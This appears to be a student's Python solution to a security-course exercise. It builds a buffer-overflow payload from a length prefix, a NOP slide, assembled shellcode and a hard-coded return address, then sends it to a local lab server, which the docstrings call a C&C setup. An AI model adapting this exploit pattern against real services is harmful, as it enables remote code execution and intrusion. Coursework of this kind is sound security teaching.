import os
import socket
import struct
from infosec.core import assemble


HOST = '127.0.0.1'
SERVER_PORT = 8000
LOCAL_PORT = 1337
NOP = '\x90'

PATH_TO_SHELLCODE = './shellcode.asm'


def get_shellcode() -> bytes:
    """This function returns the machine code (bytes) of the shellcode.

    This does not include the size, return address, nop slide or anything else!
    From this function you should return only the bytes of the shellcode! The
    assembly code of the shellcode should be saved in `shellcode.asm`, use the
    `assemble` module to translate the assembly to bytes.

    WARNINGS:
    0. Don't delete this function or change it's name/parameters - we are going
       to use it from q3.py.
    1. Use the PATH_TO_SHELLCODE variable, and avoid hard-coding the path to the
       assembly file in your code.
    2. If you reference any external file, it must be *relative* to the current
       directory! For example './shellcode.asm' is OK, but
       '/home/user/4/shellcode.asm' is bad because it's an absolute path!

    Tips:
    1. For help with the `assemble` module, run the following command (in the
       command line).
           ipython3 -c 'from infosec.core import assemble; help(assemble)'
    2. You can assume the IP and port of the C&C server won't change - they'll
       always be the values you see above in HOST and LOCAL_PORT.

    Returns:
         The bytes of the shellcode.
    """
    shellcode = assemble.assemble_file(PATH_TO_SHELLCODE)
    return shellcode

def get_payload() -> bytes:
    """This function returns the data to send over the socket to the server.

    This includes everything - the 4 bytes for size, the nop slide, the
    shellcode, the return address (and the zero at the end).

    WARNINGS:
    0. Don't delete this function or change it's name/parameters - we are going
       to test it directly in our tests, without running the main() function
       below.

    Tips:
    1. Use the `get_shellcode()` function from above, and just add the missing
       parts here.
    2. As before, use the `assemble` module to translate assembly into bytes.

    Returns:
         The bytes of the payload.
    """
    shellcode_decoded = get_shellcode().decode('latin1')
    size = network_order_uint32(1040 + 4 + 1)
    size_decoded = size.decode('latin1')
    patched_ret_addr = struct.pack('<I', 0xbfffde62)
    patched_ret_addr_decoded = patched_ret_addr.decode('latin1')
    payload = size_decoded + shellcode_decoded.rjust(1040, NOP) + patched_ret_addr_decoded + "\x00"
    print(f"len: {len(payload)}")
    print(f"latin trash: {payload}")
    print(f"bytes: {payload.encode('latin1')}")
    return payload.encode('latin1')

def network_order_uint32(value) -> bytes:
    return struct.pack('>L', value)

def get_wrapper_payload_with_length(message: str) -> bytes:
    if message[-1] != '\0':
        message = message + '\0'
    # Convert from string to bytes
    message = message.encode('latin1')
    return network_order_uint32(len(message)) + message

def main():
    # WARNING: DON'T EDIT THIS FUNCTION!
    payload = get_payload()
    conn = socket.socket()
    conn.connect((HOST, SERVER_PORT))
    try:
        conn.sendall(payload)
    finally:
        conn.close()


if __name__ == '__main__':
    main()